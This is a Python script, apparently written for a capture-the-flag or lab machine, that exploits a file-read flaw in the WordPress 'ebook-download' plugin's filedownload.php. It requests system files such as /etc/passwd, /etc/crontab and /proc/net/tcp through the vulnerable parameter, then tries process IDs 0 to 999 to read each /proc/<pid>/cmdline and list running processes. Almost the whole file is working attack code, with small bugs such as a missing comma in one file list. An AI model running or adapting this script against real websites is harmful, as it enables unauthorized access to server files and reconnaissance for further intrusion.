import requests

# if __name__ == "__main__":
#     common_files_requests()
url = 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl='
# r = requests.get('http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/cmdline')
# print(r.text)

def common_files_requests():
    # List of files of interest
    common_files = [
        "/etc/passwd",
        "/etc/crontab",
        "/proc/mounts",
        "/etc/issue",
        "/proc/version",
        "/etc/resolv.conf",
        "/etc/hostname",
        "/etc/anacrontab"
    ]

    # Send request and print the output
    for files in common_files:
        file_url = url + files
        print("Now requesting %s", (file_url))
        r = requests.get(file_url)
        print(r.text)
        print("\n")
    return 0

def network_info_requests():
    # Network info directory
    network_dir = [
        "/proc/net/tcp",
        "proc/udp/udp"
        "/proc/net/arp",
        "/proc/net/dev"
    ]

    # Send the request and print the output
    for dir in network_dir:
        file_url = url + dir
        print("Now requesting %s", (file_url))
        r = requests.get(file_url)
        print(r.text)
        print("\n")
    return 0

def process_info_requests():
    for i in range(0,1000):
        file = "/proc/" + str(i) + "/cmdline"
        file_url = url + file
        r = requests.get(file_url) 
        if len(r.content) > 82 :
            print("Now requesting %s", file_url)
            print(r.text)
            print(len(r.content))
        
    return

if __name__ == "__main__":
    # common_files_requests()
    # network_info_requests()
    process_info_requests()
